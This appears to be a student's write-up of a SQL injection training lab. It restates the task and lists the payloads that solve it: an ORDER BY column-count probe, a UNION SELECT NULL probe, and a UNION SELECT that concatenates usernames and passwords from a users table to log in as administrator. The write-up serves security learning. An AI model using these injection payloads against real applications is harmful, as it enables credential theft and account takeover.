Lab: SQL injection UNION attack, retrieving data from other tables

QUESTION:
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

    The database contains a different table called users, with columns called username and password.

    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
    
=======================================
ANALYSIS:
-GOALS: retrieves all usernames and passwords from table users with UNION attack in category filter

SIMPLE LOGIC UNION:
- SELECT a, b, c FROM table1

-SOLVE: 
1. We don't know, how many columns are displayed on the web. Use ORDER BY [NUMBER] or ORDER BY 1 to count the number of columns displayed. IF when calculating an error occurs then the column number has been skipped.

|  ' ORDER BY 1-- |

2. Use UNION to combine SELECT query with column NULL
3. Select NULL value: ' UNION SELECT NULL,NULL -- "USE SPCASE FOR GENERAL COMMENT"
4. Select table users & merge by commenting the query behind it: ' UNION SELECT NULL,username||' PASS:'||password FROM users ORDER BY 1 DESC -- "USE SPCASE FOR GENERAL COMMENT"

FULL LOGIC UNION:
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT NULL,username||' PASS:'||password FROM users ORDER BY 1 DESC-- "SPACE"'
